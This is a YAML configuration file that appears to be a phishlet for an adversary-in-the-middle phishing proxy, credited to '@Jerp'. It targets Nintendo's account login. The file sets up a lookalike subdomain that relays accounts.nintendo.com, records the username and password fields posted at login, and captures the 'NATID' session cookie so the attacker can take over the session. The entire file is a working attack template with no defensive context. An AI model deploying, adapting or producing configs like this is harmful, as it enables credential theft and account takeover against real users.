author: '@Jerp'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'nintendo', orig_sub: 'accounts', domain: 'nintendo.com', session: true, is_landing: true}

sub_filters:
  - {triggers_on: 'nintendo.com', orig_sub: 'accounts', domain: 'nintendo.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}

auth_tokens:
  - domain: 'accounts.nintendo.com'
    keys: ['NATID']

auth_urls:   

credentials:
  username:
    key: 'subject_id'
    search: '(.*)'
    type: 'post'
  password:
    key: 'subject_password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'accounts.nintendo.com'
  path: '/login'
